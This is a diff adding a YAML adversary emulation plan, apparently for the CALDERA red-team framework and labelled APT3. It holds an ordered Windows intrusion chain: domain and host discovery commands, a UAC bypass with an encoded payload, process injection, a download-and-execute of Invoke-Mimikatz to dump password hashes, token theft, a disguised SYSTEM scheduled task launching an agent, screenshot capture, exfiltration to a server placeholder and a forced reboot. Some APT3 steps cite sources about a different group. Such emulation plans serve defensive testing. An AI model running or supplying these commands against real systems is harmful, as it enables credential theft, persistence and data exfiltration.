@@ -1,0 +1,763 @@
+# APT3.yaml - CALDERA and Atomic style TTPs
+
+- emulation_plan_details:
+    id: 9e69f345-fdfe-4bbc-bc4f-1c588fa56b4f
+    adversary_name: APT3
+    adversary_description: APT3 (...)
+    attack_version: 8.1
+    format_version: 1.0
+
+# Step 2
+
+# Phase 1
+
+- id: ee08a427-1e1d-4d8a-aeb1-978a7fcf9087
+  name: System Network Configuration Discovery
+  description: The ipconfig utility is executed via cmd to enumerate local TCP/IP network configuration information.
+  tactic: discovery
+  technique:
+    attack_id: T1016
+    name: "System Network Configuration Discovery"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_discovery
+  procedure_step: "2.A.1"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          ipconfig /all
+
+  executors:
+  - name: command_prompt
+    command: |
+      ipconfig /all
+
+- id: 64f1fcb4-399d-4f3b-9a6b-13ec00e1c2ce
+  name: System Network Configuration Discovery
+  description: The arp utility is executed via cmd to enumerate local ARP configuration information.
+  tactic: discovery
+  technique:
+    attack_id: T1016
+    name: "System Network Configuration Discovery"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_discovery
+  procedure_step: "2.A.2"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          arp -a
+
+  executors:
+  - name: command_prompt
+    command: |
+      arp -a
+
+# Phase 2
+
+- id: 35d95b64-c1f8-4ac7-a2f2-8959218239cd
+  name: System Owner / User Discovery
+  description: The native echo command is executed via cmd to enumerate local environment variables associated with current user and domain.
+  tactic: discovery
+  technique:
+    attack_id: T1033
+    name: "System Owner/User Discovery"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_discovery
+  procedure_step: "2.B.1"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          echo %USERDOMAIN%\%USERNAME%
+
+  executors:
+  - name: command_prompt
+    command: |
+      echo %USERDOMAIN%\%USERNAME%
+
+# Phase 3
+
+- id: 5df12481-9d8c-4235-b550-9cefc8ed7361
+  name: Process Discovery
+  description: API call(s) are executed to enumerate local running processes.
+  tactic: discovery
+  technique:
+    attack_id: T1057
+    name: "Process Discovery"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_discovery
+  procedure_step: "2.C.1"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          Import-Module .\ps.ps1 -Verbose -Force;
+          ProcessList
+        payloads:
+        - ps.ps1
+
+  executors:
+  - name: powershell
+    command: |
+      Import-Module .\ps.ps1 -Verbose -Force;
+      ProcessList
+
+- id: 41610306-087c-4c34-874b-37b8ed633a36
+  name: Process Discovery
+  description: The tasklist utility is executed via cmd to enumerate local running processes.
+  tactic: discovery
+  technique:
+    attack_id: T1057
+    name: "Process Discovery"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_discovery
+  procedure_step: "2.C.2"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          tasklist /v
+
+  executors:
+  - name: command_prompt
+    command: |
+      tasklist /v
+
+# Phase 4
+
+- id: 2ff877b4-0c00-401e-9d3f-070c70b610df
+  name: System Service Discovery
+  description: The sc utility is executed via cmd to enumerate local active services.
+  tactic: discovery
+  technique:
+    attack_id: T1007
+    name: "System Service Discovery"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_discovery
+  procedure_step: "2.D.1"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          sc query
+
+  executors:
+  - name: command_prompt
+    command: |
+      sc query
+
+- id: 144b1384-5060-494f-80eb-91772695cdf3
+  name: System Service Discovery
+  description: The net utility is executed via cmd to enumerate local active services.
+  tactic: discovery
+  technique:
+    attack_id: T1007
+    name: "System Service Discovery"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_discovery
+  procedure_step: "2.D.2"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          net start
+
+  executors:
+  - name: command_prompt
+    command: |
+      net start
+
+# Phase 5
+
+- id: d2ea2676-7f85-4228-b980-ab3c0e1adc03
+  name: System Information Discovery
+  description: The systeminfo utility is executed via cmd to enumerate local operating system configuration.
+  tactic: discovery
+  technique:
+    attack_id: T1082
+    name: "System Information Discovery"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_discovery
+  procedure_step: "2.E.1"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          systeminfo
+
+  executors:
+  - name: command_prompt
+    command: |
+      systeminfo
+
+- id: 7c2a6e5b-1adb-464f-a581-4677391f8dd6
+  name: System Information Discovery
+  description: The net utility is executed via cmd to enumerate local operating system configuration.
+  tactic: discovery
+  technique:
+    attack_id: T1082
+    name: "System Information Discovery"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_discovery
+  procedure_step: "2.E.2"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          net config workstation
+
+  executors:
+  - name: command_prompt
+    command: |
+      net config workstation
+
+# Phase 6
+
+- id: faa96e7f-081a-40b7-a743-a6a7f2627ea3
+  name: Permissions Groups Discovery
+  description: The net utility is executed via cmd to enumerate members of the local system's administrators group.
+  tactic: discovery
+  technique:
+    attack_id: T1069
+    name: "Permission Groups Discovery"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_discovery
+  procedure_step: "2.F.1"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          net localgroup administrators
+
+  executors:
+  - name: command_prompt
+    command: |
+      net localgroup administrators
+
+- id: 26181249-be75-41ed-9fe7-5c30ea8c2d4d
+  name: Permissions Groups Discovery
+  description: The net utility is executed via cmd to enumerate members of the domain controller’s administrators group.
+  tactic: discovery
+  technique:
+    attack_id: T1069
+    name: "Permission Groups Discovery"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_discovery
+  procedure_step: "2.F.2"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          net localgroup administrators /domain
+
+  executors:
+  - name: command_prompt
+    command: |
+      net localgroup administrators /domain
+
+- id: 84377d7a-0363-44fd-a082-44657ca1858f
+  name: Permissions Groups Discovery
+  description: The net utility is executed via cmd to enumerate members of the domain administrators group.
+  tactic: discovery
+  technique:
+    attack_id: T1069
+    name: "Permission Groups Discovery"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_discovery
+  procedure_step: "2.F.3"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          cmd.exe /c net group "Domain Admins" /domain
+
+  executors:
+  - name: powershell
+    command: |
+      cmd.exe /c net group "Domain Admins" /domain
+
+# Phase 7
+
+- id: 61221fb9-cb32-46d5-98fd-90567a621526
+  name: Account Discovery
+  description: The net utility is executed via cmd to enumerate domain user accounts.
+  tactic: discovery
+  technique:
+    attack_id: T1087
+    name: "Account Discovery"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_discovery
+  procedure_step: "2.G.1"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          net user /domain
+
+  executors:
+  - name: command_prompt
+    command: |
+      net user /domain
+
+- id: 9ce5bf9f-44ec-44c4-bbe0-6d68a83e1b76
+  name: Account Discovery
+  description: The net utility is executed via cmd to enumerate detailed information about a specific user account.
+  tactic: discovery
+  technique:
+    attack_id: T1087
+    name: "Account Discovery"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_discovery
+  procedure_step: "2.G.2"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          net user %USERNAME% /domain
+
+  executors:
+  - name: command_prompt
+    command: |
+      net user %USERNAME% /domain
+
+# Phase 8
+
+- id: 5c23f638-9cfc-4fc4-9cab-4af628fef70a
+  name: Query Registry
+  description: The reg utility is executed via cmd to enumerate a specific Registry key associated with local system policies to ensure that the user will not be prompted for credentials when elevating permissions.
+  tactic: discovery
+  technique:
+    attack_id: T1012
+    name: "Query Registry"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_discovery
+  procedure_step: "2.H.1"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+
+  executors:
+  - name: command_prompt
+    command: |
+      reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+
+# Step 3
+
+# Phase 9
+
+- id: 1345bff7-6f26-43b2-a92a-9aabccdb3db0
+  name: Bypass User Account Control
+  description: A UAC bypass technique is executed to steal the token of an existing high-integrity process and launch a new, high-integrity RAT with limited functionality.
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1134.001
+    name: "Access Token Manipulation: Token Impersonation/Theft"
+  cti_source: "https://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016"
+  procedure_group: procedure_privesc
+  procedure_step: "3.A.1"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          Import-Module .\Invoke-BypassUACTokenManipulation.ps1 -Verbose -Force;
+          Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force;
+          $pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Import-Module $env:APPDATA\update.ps1;update('#{server}')"));
+          Invoke-BypassUACTokenManipulation -Arguments "-nop -exec bypass -EncodedCommand $pcode" -Verbose
+        payloads:
+        - update.ps1
+        - Invoke-BypassUACTokenManipulation.ps1
+
+  input_arguments:
+    server:
+      description: IP or Hostname of server
+      type: string
+      default: 192.0.2.10
+
+  executors:
+  - name: powershell
+    command: |
+      Import-Module .\Invoke-BypassUACTokenManipulation.ps1 -Verbose -Force;
+      Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force;
+      $pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Import-Module $env:APPDATA\update.ps1;update('#{server}')"));
+      Invoke-BypassUACTokenManipulation -Arguments "-nop -exec bypass -EncodedCommand $pcode" -Verbose
+
+# Phase 10
+
+- id: 088b8639-3f37-42cc-9dc8-01aabb645461
+  name: Process Injection
+  description: The limited functionality high-integrity RAT will inject malicious code into an existing fully functional high-integrity process, resulting in a new elevated, fully functional high-integrity RAT.
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1055
+    name: "Process Injection"
+  cti_source: "https://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016"
+  procedure_group: procedure_privesc
+  procedure_step: "3.B.1 - 3.C.1"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          Import-Module .\Invoke-PSInject.ps1 -Verbose -Force;
+          Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force;
+          $pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Import-Module $env:APPDATA\update.ps1;update('#{server}')"));
+          Inject -PoshCode $pcode;
+        payloads:
+        - update.ps1
+        - Invoke-PSInject.ps1
+
+  input_arguments:
+    server:
+      description: IP or Hostname of server
+      type: string
+      default: 192.0.2.10
+
+  executors:
+  - name: powershell
+    command: |
+      Import-Module .\Invoke-PSInject.ps1 -Verbose -Force;
+      Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force;
+      $pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Import-Module $env:APPDATA\update.ps1;update('#{server}')"));
+      Inject -PoshCode $pcode;
+
+# Step 4
+
+# Phase 11
+
+- id: 59592c35-8207-4896-8d8b-36ad4600245d
+  name: Remote System Discovery
+  description: The net utility is executed via cmd to enumerate DCs within the domain
+  tactic: discovery
+  technique:
+    attack_id: T1018
+    name: "Remote System Discovery"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_discovery
+  procedure_step: "4.A.1"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          cmd.exe /c net group "Domain Controllers" /domain
+
+  executors:
+  - name: powershell
+    command: |
+      cmd.exe /c net group "Domain Controllers" /domain
+
+- id: 24ed020e-4730-4000-b6b4-6b5d3e95314f
+  name: Remote System Discovery
+  description: The net utility is executed via cmd to enumerate hosts within the domain.
+  tactic: discovery
+  technique:
+    attack_id: T1018
+    name: "Remote System Discovery"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_discovery
+  procedure_step: "4.A.2"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          cmd.exe /c net group "Domain Computers" /domain
+
+  executors:
+  - name: powershell
+    command: |
+      cmd.exe /c net group "Domain Computers" /domain
+
+# Phase 12
+
+- id: 5f4263c4-7ff1-4098-b5f5-f41faa31cf5b
+  name: System Network Configuration Discovery
+  description: The netsh utility is executed via cmd to enumerate local firewall configuration information.
+  tactic: discovery
+  technique:
+    attack_id: T1016
+    name: "System Network Configuration Discovery"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_discovery
+  procedure_step: "4.B.1"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          netsh advfirewall show allprofiles
+
+  executors:
+  - name: command_prompt
+    command: |
+      netsh advfirewall show allprofiles
+
+# Phase 13
+
+- id: ba0b398d-91b8-490a-bed2-f959afa8e1aa
+  name: System Network Connections Discovery (T1049)
+  description: The netstat utility is executed via cmd to enumerate local active network connections.
+  tactic: discovery
+  technique:
+    attack_id: T1049
+    name: "System Network Connections Discovery"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_discovery
+  procedure_step: "4.C.1"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          netstat -ano
+
+  executors:
+  - name: command_prompt
+    command: |
+      netstat -ano
+
+# Step 5
+
+# Phase 14
+
+- id: 4ef6009d-2d62-4bb4-8de9-0458df2e9567
+  name: Credential Dumping
+  description: Dumping credentials via wmidump (Mimikatz)
+  tactic: credential-access
+  technique:
+    attack_id: T1003
+    name: "Credential Dumping"
+  cti_source: "https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/"
+  procedure_group: procedure_cred_access
+  procedure_step: "5.A.1"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          . .\stepFourteen_credDump.ps1;
+        payloads:
+        - stepFourteen_credDump.ps1
+
+  executors:
+  - name: powershell
+    command: |
+      . .\stepFourteen_credDump.ps1;
+
+# Phase 15
+
+- id: effbedc1-1bc8-4a75-9395-980559700008
+  name: Credential Dumping using Process Injection
+  description: Mimikatz lsadump::sam is executed via Invoke-Mimikatz to dump hashes via process injection into LSASS.
+  tactic: credential-access
+  technique:
+    attack_id: T1003
+    name: "Credential Dumping"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_cred_access
+  procedure_step: "5.A.2"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };
+          $web = (New-Object System.Net.WebClient);
+          $result = $web.DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1");
+          iex $result;
+          function hashdump
+          {
+              Invoke-Mimikatz -Command "privilege::debug token::elevate lsadump::sam exit"
+          };
+          hashdump;
+
+  executors:
+  - name: powershell
+    command: |
+      [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };
+      $web = (New-Object System.Net.WebClient);
+      $result = $web.DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1");
+      iex $result;
+      function hashdump
+      {
+          Invoke-Mimikatz -Command "privilege::debug token::elevate lsadump::sam exit"
+      };
+      hashdump;
+
+# Phase 16
+
+- id: 03afada1-1714-408f-bde5-f528b91dc89d
+  name: 5.B.1 - Access Token Manipulation (T1134),
+    6.A.1 - Query Registry (T1012),
+    7.B.1 - Remote File Copy (T1105),
+    7.C.1 - Scheduled Tasks (T1053),
+    8.A.1/2 - File and Directory Discovery (T1083)
+  description: A token theft script was executed to steal and assume the token of another user’s existing process, changing the user context of the process.
+  tactic: defensive-evasion
+  technique:
+    attack_id: T1134
+    name: "Access Token Manipulation"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_def_evasion
+  procedure_step: "5.B.1 - 8.A.2"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          Import-Module .\StealToken.ps1 -Verbose -Force;
+          StealToken;
+          CreateProcessWithToken -CommandLine 'cmd.exe /c reg query "\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server"';
+          CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn "Resume Viewer Update Checker" /tr ".\sandcat.exe #{server} evals" /sc ONLOGON /RU SYSTEM';
+          CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
+          CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
+          RevertToSelf;
+        payloads:
+        - StealToken.ps1
+        - sandcat.go-windows
+
+  input_arguments:
+    remote.file.share:
+      description: IP or Hostname of remote file share
+      type: string
+      default: 192.0.2.10
+
+    server:
+      description: IP or Hostname of server
+      type: string
+      default: 127.0.0.1
+
+  executors:
+  - name: powershell
+    command: |
+      Import-Module .\StealToken.ps1 -Verbose -Force;
+      StealToken;
+      CreateProcessWithToken -CommandLine 'cmd.exe /c reg query "\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server"';
+      CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn "Resume Viewer Update Checker" /tr ".\sandcat.exe #{server} evals" /sc ONLOGON /RU SYSTEM';
+      CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
+      CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
+      RevertToSelf;
+
+# Step 8
+
+# Phase 17
+
+- id: 0b1841bd-ef8b-475c-bce7-8fcb2860984a
+  name: Screen Capture (T1113)
+  description: Native API call(s) were used to collect a screenshot.
+  tactic: collection
+  technique:
+    attack_id: T1113
+    name: "Screen Capture"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_collection
+  procedure_step: "8.D.1"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          Import-Module .\Get-Screenshot.ps1 -Verbose -Force;
+          Get-Screenshot;
+        payloads:
+        - Get-Screenshot.ps1
+
+  executors:
+  - name: powershell
+    command: |
+      Import-Module .\Get-Screenshot.ps1 -Verbose -Force;
+      Get-Screenshot;
+
+# Step 9
+
+# Phase 18
+
+- id: d5170a60-3bdc-44e0-9870-a38db5c0cf81
+  name: File and Directory Discovery (T1083)
+  description: PowerShell's Get-ChildItem alias 'ls' is used to enumerate files in a remote file share.
+  tactic: discovery
+  technique:
+    attack_id: T1083
+    name: "File and Directory Discovery"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_discovery
+  procedure_step: "9.A.1"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          ls #{remote.file.share}
+
+  input_arguments:
+    remote.file.share:
+      description: IP or Hostname of remote file share
+      type: string
+      default: 192.0.2.20
+
+  executors:
+  - name: powershell
+    command: |
+      ls #{remote.file.share}
+
+- id: 2d18c8ec-4593-49dc-9bf4-11d0673d6ae6
+  name: Data from staged file (T1074) and Exfiltration over C2 Channel (T1041)
+  description: Copy a target file from a remote file share through the existing C2 channel
+  tactic: exfiltration
+  technique:
+    attack_id: T1041
+    name: "Exfiltration Over C2 Channel"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_exfiltration
+  procedure_step: "9.B.1"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          Import-Module .\upload.ps1 -Verbose -Force;
+          Invoke-MultipartFormDataUpload -InFile "C:\Users\#{profile_user}\Desktop\working.zip" -Uri "#{server}/file/upload";
+        cleanup: |
+          remove-item upload.ps1 -Force
+        payloads:
+        - upload.ps1
+
+  input_arguments:
+    profile_user:
+      description: Name of profile user
+      type: string
+      default: Administrator
+
+    server:
+      description: IP or Hostname of server
+      type: string
+      default: 192.0.2.10
+
+  executors:
+  - name: powershell
+    command: |
+      Import-Module .\upload.ps1 -Verbose -Force;
+      Invoke-MultipartFormDataUpload -InFile "C:\Users\#{profile_user}\Desktop\working.zip" -Uri "#{server}/file/upload";
+    cleanup_command: |
+      remove-item upload.ps1 -Force
+
+# Step 10
+
+# Phase 19
+
+- id: 4b2e9574-b1a7-4b38-95b2-6054ded9c4fe
+  name: Scheduled Task
+  description: Reboot the machine to aid in peristence callbacks
+  tactic: impact
+  technique:
+    attack_id: T1529
+    name: "System Shutdown/Reboot"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_impact
+  procedure_step: "10.A.1-10.A.2"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          write-host "[*] Restarting Computer";
+          Restart-Computer -Force;
+
+  executors:
+  - name: powershell
+    command: |
+      write-host "[*] Restarting Computer";
+      Restart-Computer -Force;
+
+
